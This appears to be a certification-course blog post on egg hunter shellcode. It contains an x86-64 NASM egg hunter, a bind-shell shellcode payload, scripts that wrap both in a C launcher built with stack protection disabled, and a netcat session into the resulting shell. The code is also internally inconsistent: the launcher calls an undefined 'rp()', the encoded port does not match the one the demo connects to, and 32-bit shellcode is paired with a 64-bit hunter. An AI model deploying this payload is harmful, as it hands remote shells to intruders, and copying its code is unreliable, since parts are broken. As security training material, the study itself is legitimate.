# SLAE Assignment #3

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://www.securitytube-training.com/online-­courses/x8664-assembly-and-shellcoding-on-linux/index.html

Student ID: SLAE64 - 1525

## Assignment

* Study about the Egg Hunter shellcode
* Create a working demo of the Egghunter
* Should be configurable for different payloads

## Resources

* http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

## Egg Hunters theory

For this assignment it's required to study the egg hunting tecniques, and come up with a fully working implementation.

Usually when a BOF happens, there isn't a lot of space available for the payload, what happens in most of cases is that a small portion of shellcode is put on the stack and directly accessible and 
another part instead is put somewhere else, and have much more space available. The egg hunting tecnique consists in a two staged payload, the first, smaller, searches for a particular pattern in memory, with which the second larger part is identified and executed. As from the paper mentioned earlier the pattern is usually 4 bytes long, and repeated twice, so that the egg-hunter won't transfer execution to its own code.

## Implementation

The shellcode used is the one for shell bind, the only change is that it will be prefixed with a short premises of 8 bytes that will be the pattern searched by the egg hunter.
Here follows the egg-hunter code:

```
; Filename: EggHunter.nasm
; Author: SLAE64 - 1525
;
; Purpose: execute through egg-hunter routine the shellcode of ShellBindTcp
BITS 64

global _start			

section .text

EGG equ 'ABCD'

_start:
    ; load final address in rax
    lea rax, [rel address_space_end]

search:
    inc rax
    cmp dword [eax], EGG
    jne search
    cmp dword [eax + 0x4], EGG
    jne search
    add rax, 8
    jmp rax

address_space_end:
```

Compiling the assembler code to shellcode with the following script:

```
echo '[+] Assembling with Nasm ... ' # Nasm shell source: file.nasm
nasm -f elf64 -o $1.o $1.nasm
echo '[+] Done!'

echo '[+] Linking ...'
ld -z execstack -o $1 $1.o
echo '[+] Done!'

# Remove object file
rm -rf $1.o

echo '[+] Dumping Shellcode ...'
objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\x/g'|paste -d '' -s |sed 's/^/"/' | sed 's/$/"/g'
echo '[+] Done!'

# Remove executable
rm -rf $1
```

which generates the following output (shellcode asm):

```
$ ./compile-nasm.sh egg-hunter      
[+] Assembling with Nasm ... 
[+] Done!
[+] Linking ...
[+] Done!
[+] Dumping Shellcode ...
"\x48\x8d\x05\x18\x00\x00\x00\x48\xff\xc0\x67\x81\x38\x41\x42\x43\x44\x75\xf4\x67\x81\x78\x04\x41\x42\x43\x44\x75\xea\x48\x83\xc0\x08\xff\xe0"
[+] Done!
```

We are using the same shellcode of the previous assignment (shell bind). The following script allows easily customization of the egg payload and of the shellcode itself:

```
# Ex: ./compile.sh ABCD "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# Ex: ./compile.sh ABCD "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

echo '######### NASM #########'
echo '[+] Customizing Tag: '$1 # $1 Tag like: ABCD
tag=`echo -n $1 | xxd -ps | sed 's/[[:xdigit:]]\{2\}/\\\x&/g'`
echo '[+] Done!'

echo '[+] Customizing Shellcode: '$2 # $2 Shellcode: \x00\x01..
shellcode=$2
echo '[+] Done!'

echo '[+] Assemble shellcode C ...'

echo "#include<stdio.h>" >shellcode.c
echo "#include<string.h>" >>shellcode.c
echo "#define EGG \"$tag\"" >>shellcode.c
echo "unsigned char egghunter[] = \"\x48\x8d\x05\x18\x00\x00\x00\x48\xff\xc0\x67\x81\x38\"" >>shellcode.c
echo "                            EGG" >>shellcode.c
echo "                            \"\x75\xf4\x67\x81\x78\x04\"" >>shellcode.c
echo "                            EGG" >>shellcode.c
echo "                            \"\x75\xea\x48\x83\xc0\x08\xff\xe0\";" >>shellcode.c
echo "unsigned char shellcode[] = EGG" >>shellcode.c
echo "                            EGG" >>shellcode.c
echo "                            \"$shellcode\";" >>shellcode.c
echo "int main (int argc, char** argv) {" >>shellcode.c
echo "    printf(\"Shellcode Length: %d\\n\", (int) strlen(shellcode));" >>shellcode.c
echo "    printf(\"Egghunter Length: %d\\n\", (int) strlen(egghunter));" >>shellcode.c
echo "    int (*p)() = (int(*)())egghunter;" >>shellcode.c
echo "    rp();" >>shellcode.c
echo "}" >>shellcode.c

echo '[+] Done!'

echo '[+] Assemble shellcode.c ...'
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

The script is executed as follows:

```
$ ./compile.sh ABCD "\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x6a\x05\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x89\xc6\x31\xc0\xb0\x02\xcd\x80\x09\xc0\x75\x49\x31\xc0\xb0\x06\x89\xfb\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x31\xc9\xb1\x01\xfe\xc9\xcd\x80\x31\xc0\xb0\x3f\x31\xc9\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x31\xc9\xb1\x02\xcd\x80\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb1\x01\xfe\xc9\x31\xc9\x88\xca\xcd\x80\x31\xc0\xb0\x06\x89\xf3\xcd\x80\xeb\x90"
######### NASM #########
[+] Customizing Tag: ABCD
[+] Done!
[+] Customizing Shellcode: \x31\xc0\xb0\x66\x31\xdb\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x6a\x05\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x89\xc6\x31\xc0\xb0\x02\xcd\x80\x09\xc0\x75\x49\x31\xc0\xb0\x06\x89\xfb\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x31\xc9\xb1\x01\xfe\xc9\xcd\x80\x31\xc0\xb0\x3f\x31\xc9\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x31\xc9\xb1\x02\xcd\x80\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb1\x01\xfe\xc9\x31\xc9\x88\xca\xcd\x80\x31\xc0\xb0\x06\x89\xf3\xcd\x80\xeb\x90
[+] Done!
[+] Assemble shellcode C ...
[+] Done!
[+] Assemble shellcode.c ...
```

## Proof of execution

The executed shellcode leads to the following output that confirms it's correctness:
```
$ ./shellcode
Shellcode length: 164
Egghunter length: 36

```

and successful connection with execution of a system command into the bind shell:

```
$ nc -vv localhost 3333
Connection to localhost 3333 port [tcp/*] succeeded!
abcd
id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
```